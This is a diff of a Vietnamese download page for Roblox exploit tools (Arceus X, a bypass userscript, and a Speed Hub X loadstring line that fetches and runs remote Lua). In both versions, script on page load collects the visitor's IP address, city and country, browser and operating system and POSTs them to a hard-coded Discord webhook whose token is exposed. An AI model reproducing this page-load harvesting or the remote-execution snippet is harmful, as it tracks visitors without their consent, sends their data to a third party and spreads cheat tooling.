@@ -11,6 +11,7 @@
       --accent: #00f2fe;
       --dark: #121212;
       --light: #f8f9fa;
+      --card-bg: rgba(30, 30, 45, 0.8);
     }
     
     * {
@@ -22,35 +23,20 @@
     
     body, html {
       height: 100%;
-      background: linear-gradient(135deg, var(--dark), #1a1a2e);
+      background: linear-gradient(135deg, #0f0f1a, #1a1a2e);
       color: var(--light);
       overflow-x: hidden;
-    }
-    
-    .video-background {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: -1;
-      opacity: 0.15;
-      pointer-events: none;
-      user-select: none;
-      -webkit-user-select: none;
-    }
-    
-    .video-background video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      pointer-events: none;
     }
     
     .container {
       max-width: 1200px;
       margin: 0 auto;
       padding: 2rem;
+    }
+    
+    /* Phần công cụ Arceus X */
+    .tools-section {
+      margin-bottom: 3rem;
     }
     
     header {
@@ -69,13 +55,6 @@
       font-weight: 700;
     }
     
-    header p {
-      font-size: 1.1rem;
-      color: rgba(255, 255, 255, 0.7);
-      max-width: 700px;
-      margin: 0 auto;
-    }
-    
     .card-grid {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
@@ -89,13 +68,11 @@
       padding: 2rem;
       border: 1px solid rgba(255, 255, 255, 0.1);
       transition: transform 0.3s ease, box-shadow 0.3s ease;
-      animation: fadeInUp 0.8s ease;
     }
     
     .card:hover {
-      transform: translateY(-10px);
-      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
-      border-color: var(--accent);
+      transform: translateY(-5px);
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
     }
     
     .card h2 {
@@ -107,12 +84,6 @@
       gap: 0.5rem;
     }
     
-    .card p {
-      color: rgba(255, 255, 255, 0.7);
-      margin-bottom: 1.5rem;
-      line-height: 1.6;
-    }
-    
     .code-box {
       background: rgba(0, 0, 0, 0.3);
       border: 1px solid rgba(0, 242, 254, 0.3);
@@ -121,9 +92,8 @@
       font-family: 'Courier New', monospace;
       font-size: 0.9rem;
       color: var(--accent);
-      margin-bottom: 1.5rem;
+      margin: 1rem 0;
       overflow-x: auto;
-      position: relative;
     }
     
     .btn {
@@ -137,52 +107,82 @@
       transition: all 0.3s ease;
       border: none;
       cursor: pointer;
-      font-size: 0.95rem;
     }
     
-    .btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 5px 15px rgba(106, 17, 203, 0.4);
-    }
-    
-    .btn-copy {
-      background: rgba(0, 242, 254, 0.1);
-      border: 1px solid var(--accent);
-      color: var(--accent);
-      width: 100%;
-    }
-    
-    .btn-copy:hover {
-      background: rgba(0, 242, 254, 0.2);
-    }
-    
-    .tool-icon {
-      font-size: 1.8rem;
-    }
-    
-    footer {
-      text-align: center;
+    /* Phần webhook info */
+    .webhook-section {
       margin-top: 4rem;
-      padding-top: 2rem;
-      border-top: 1px solid rgba(255, 255, 255, 0.1);
-      color: rgba(255, 255, 255, 0.5);
+    }
+    
+    .webhook-card {
+      background: var(--card-bg);
+      backdrop-filter: blur(10px);
+      border-radius: 16px;
+      padding: 30px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      max-width: 800px;
+      margin: 0 auto;
+    }
+    
+    .webhook-header {
+      text-align: center;
+      margin-bottom: 25px;
+      position: relative;
+    }
+    
+    .webhook-header h2 {
+      font-size: 1.8rem;
+      margin-bottom: 10px;
+      background: linear-gradient(to right, var(--accent), var(--secondary));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    
+    .info-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 20px;
+    }
+    
+    .info-item {
+      margin-bottom: 15px;
+    }
+    
+    .info-label {
       font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.6);
+      margin-bottom: 5px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    
+    .info-label i {
+      color: var(--accent);
+    }
+    
+    .info-value {
+      font-size: 1.1rem;
+      padding: 10px;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 6px;
+      border-left: 3px solid var(--accent);
+      word-break: break-word;
+    }
+    
+    .timestamp {
+      text-align: right;
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.5);
+      margin-top: 20px;
+      font-style: italic;
     }
     
     @keyframes fadeIn {
       from { opacity: 0; }
       to { opacity: 1; }
-    }
-    
-    @keyframes fadeInUp {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
     }
     
     @media (max-width: 768px) {
@@ -197,115 +197,178 @@
       .card-grid {
         grid-template-columns: 1fr;
       }
+      
+      .info-grid {
+        grid-template-columns: 1fr;
+      }
     }
   </style>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
 
-<div class="video-background">
-  <video autoplay muted loop playsinline disablepictureinpicture controlslist="nodownload noplaybackrate nofullscreen">
-    <source id="videoSource" src="" type="video/mp4">
-  </video>
-</div>
-
 <div class="container">
-  <header>
-    <h1>Công cụ hỗ trợ Arceus X</h1>
-    <p>Tổng hợp các công cụ và script hỗ trợ cho Arceus X giúp bạn có trải nghiệm tốt nhất</p>
-  </header>
-  
-  <div class="card-grid">
-    <div class="card">
-      <h2><i class="fas fa-download tool-icon"></i> Arceus X</h2>
-      <p>Phiên bản mới nhất của Arceus X với nhiều tính năng hỗ trợ game mạnh mẽ</p>
-      <a href="#" class="btn">Tải xuống tại đây</a>
+  <!-- Phần công cụ Arceus X -->
+  <div class="tools-section">
+    <header>
+      <h1>Công cụ hỗ trợ Arceus X</h1>
+      <p>Tổng hợp các công cụ và script hỗ trợ cho Arceus X</p>
+    </header>
+    
+    <div class="card-grid">
+      <div class="card">
+        <h2><i class="fas fa-download"></i> Arceus X</h2>
+        <p>Phiên bản mới nhất của Arceus X với nhiều tính năng hỗ trợ game</p>
+        <a href="https://vng.spdmteam.com/" class="btn">Tải xuống tại đây</a>
+      </div>
+      
+      <div class="card">
+        <h2><i class="fas fa-monkey"></i> Violentmonkey</h2>
+        <p>Trình quản lý userscript giúp bạn chạy các script tùy chỉnh</p>
+        <a href="https://addons.mozilla.org/vi/firefox/addon/violentmonkey/" class="btn">Tải Violentmonkey cho Firefox</a>
+      </div>
+      
+      <div class="card">
+        <h2><i class="fas fa-unlock-alt"></i> Script Bypass</h2>
+        <p>Bỏ qua xác minh & link rút gọn để truy cập nhanh</p>
+        <a href="https://raw.githubusercontent.com/bypass-vip/userscript/refs/heads/main/bypass-vip.user.js" class="btn">Tải script Bypass tại đây</a>
+      </div>
     </div>
     
-    <div class="card">
-      <h2><i class="fas fa-monkey tool-icon"></i> Violentmonkey</h2>
-      <p>Trình quản lý userscript giúp bạn dễ dàng quản lý và chạy các script tùy chỉnh</p>
-      <a href="#" class="btn">Tải Violentmonkey cho Firefox</a>
-    </div>
-    
-    <div class="card">
-      <h2><i class="fas fa-unlock-alt tool-icon"></i> Script Bypass</h2>
-      <p>Bỏ qua xác minh & link rút gọn để truy cập nhanh vào các tính năng</p>
-      <a href="#" class="btn">Tải script Bypass tại đây</a>
+    <div class="card" style="margin-top: 2rem;">
+      <h2><i class="fas fa-code"></i> Speed Hub X Script</h2>
+      <div class="code-box">
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+      </div>
+      <button class="btn" onclick="copyScript()">
+        <i class="far fa-copy"></i> Sao chép Script
+      </button>
     </div>
   </div>
   
-  <div class="card" style="margin-top: 2rem;">
-    <h2><i class="fas fa-code tool-icon"></i> Speed Hub X Script</h2>
-    <p>Script hỗ trợ game với nhiều tính năng hữu ích</p>
-    
-    <div class="code-box">
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+  <!-- Phần thông tin webhook -->
+  <div class="webhook-section">
+    <div class="webhook-card">
+      <div class="webhook-header">
+        <h2>Thông tin truy cập</h2>
+        <p>Dữ liệu được gửi đến Discord Webhook</p>
+      </div>
+      
+      <div class="info-grid">
+        <div class="info-item">
+          <div class="info-label">
+            <i class="fas fa-network-wired"></i> Địa chỉ IP
+          </div>
+          <div class="info-value" id="ip-value">Đang tải...</div>
+        </div>
+        
+        <div class="info-item">
+          <div class="info-label">
+            <i class="fas fa-map-marker-alt"></i> Khu vực
+          </div>
+          <div class="info-value" id="location-value">Đang tải...</div>
+        </div>
+        
+        <div class="info-item">
+          <div class="info-label">
+            <i class="fas fa-globe"></i> Trình duyệt
+          </div>
+          <div class="info-value" id="browser-value">Đang tải...</div>
+        </div>
+        
+        <div class="info-item">
+          <div class="info-label">
+            <i class="fas fa-desktop"></i> Hệ điều hành
+          </div>
+          <div class="info-value" id="os-value">Đang tải...</div>
+        </div>
+      </div>
+      
+      <div class="timestamp" id="timestamp"></div>
     </div>
-    
-    <button class="btn btn-copy" onclick="copyScript()">
-      <i class="far fa-copy"></i> Sao chép Script
-    </button>
   </div>
 </div>
-
-<footer>
-  <p>© 2023 Arceus X Tools. All rights reserved.</p>
-</footer>
 
 <script>
-  // DANH SÁCH VIDEO
-  const videos = [
-    "https://v1.pinimg.com/videos/iht/expMp4/a7/9b/2d/a79b2df8b2fefbbcc3a5ec0d32e0ccc0_720w.mp4",
-    "https://v1.pinimg.com/videos/iht/expMp4/ca/f9/c0/caf9c066b9adee71afeed8de8b8cc18c_720w.mp4",
-    "https://v1.pinimg.com/videos/iht/expMp4/f1/e7/69/f1e7697c421077b43f931265ba1b717e_720w.mp4",
-    "https://v1.pinimg.com/videos/iht/720p/72/f2/b2/72f2b2b305ef9fb941d1b05e07793066.mp4",
-    "https://v1.pinimg.com/videos/mc/720p/91/77/47/917747d4ae76d3a9c5d9e727b5f6080a.mp4",
-    "https://v1.pinimg.com/videos/mc/720p/65/d7/97/65d797f38c7af9a9b4b744b0f5e9f829.mp4"
-  ];
-  
-  // Chọn video ngẫu nhiên
-  const randomVideo = videos[Math.floor(Math.random() * videos.length)];
-  document.getElementById("videoSource").src = randomVideo;
-  
-  // Copy script
+  // Chức năng copy script
   function copyScript() {
     const box = document.querySelector(".code-box").innerText;
     navigator.clipboard.writeText(box);
-    
-    const btn = document.querySelector(".btn-copy");
-    btn.innerHTML = '<i class="fas fa-check"></i> Đã sao chép!';
-    setTimeout(() => {
-      btn.innerHTML = '<i class="far fa-copy"></i> Sao chép Script';
-    }, 2000);
+    alert("Đã sao chép script!");
   }
-  
-  // Webhook IP, trình duyệt, khu vực
-  fetch("https://api.ipify.org?format=json")
-    .then(res => res.json())
-    .then(data => {
-      const ip = data.ip;
-      const ua = navigator.userAgent;
-      const webhook = "https://discord.com/api/webhooks/1291224256721457253/TPaVwWRWJLfIM0tJu8Kcr5b0A9K-gmLW1ANGkdHsJcwiBGsN801HoygA9E20cPLl5lA0";
-      fetch("https://ipapi.co/json/")
-        .then(res => res.json())
-        .then(loc => {
-          const payload = {
-            content: `👤 Truy cập mới:
-- IP: ${ip}
-- Quốc gia: ${loc.country_name}
-- Thành phố: ${loc.city}
-- Trình duyệt: ${ua}`
-          };
-          fetch(webhook, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-          });
-        });
+
+  // Lấy thông tin và gửi webhook
+  function fetchInfo() {
+    // Hiển thị thời gian
+    const now = new Date();
+    const timeString = now.toLocaleString('vi-VN', {
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit',
+      day: '2-digit',
+      month: '2-digit',
+      year: 'numeric'
     });
+    document.getElementById('timestamp').textContent = `Cập nhật lúc: ${timeString}`;
+
+    // Lấy IP
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        document.getElementById('ip-value').textContent = ip;
+        
+        // Lấy thông tin vị trí
+        fetch(`https://ipapi.co/${ip}/json/`)
+          .then(res => res.json())
+          .then(loc => {
+            const location = `${loc.city}, ${loc.region}, ${loc.country_name}`;
+            document.getElementById('location-value').textContent = location;
+            
+            // Lấy thông tin trình duyệt
+            const ua = navigator.userAgent;
+            document.getElementById('browser-value').textContent = ua;
+            
+            // Xác định hệ điều hành
+            let os = "Không xác định";
+            if (ua.includes("Windows")) os = "Windows";
+            else if (ua.includes("Mac")) os = "MacOS";
+            else if (ua.includes("Linux")) os = "Linux";
+            else if (ua.includes("Android")) os = "Android";
+            else if (ua.includes("iOS")) os = "iOS";
+            document.getElementById('os-value').textContent = os;
+            
+            // Gửi webhook Discord
+            const webhookURL = "https://discord.com/api/webhooks/1291224256721457253/TPaVwWRWJLfIM0tJu8Kcr5b0A9K-gmLW1ANGkdHsJcwiBGsN801HoygA9E20cPLl5lA0";
+            const payload = {
+              content: `🌐 **Thông tin truy cập mới**\n` +
+                       `- **IP:** ${ip}\n` +
+                       `- **Khu vực:** ${location}\n` +
+                       `- **Trình duyệt:** ${ua}\n` +
+                       `- **Hệ điều hành:** ${os}\n` +
+                       `- **Thời gian:** ${timeString}`
+            };
+            
+            fetch(webhookURL, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify(payload)
+            });
+          });
+      })
+      .catch(error => {
+        console.error("Lỗi khi lấy thông tin:", error);
+        document.getElementById('ip-value').textContent = "Không thể xác định";
+        document.getElementById('location-value').textContent = "Không thể xác định";
+      });
+  }
+
+  // Chạy khi tải trang
+  window.onload = function() {
+    fetchInfo();
+  };
 </script>
 
 </body>
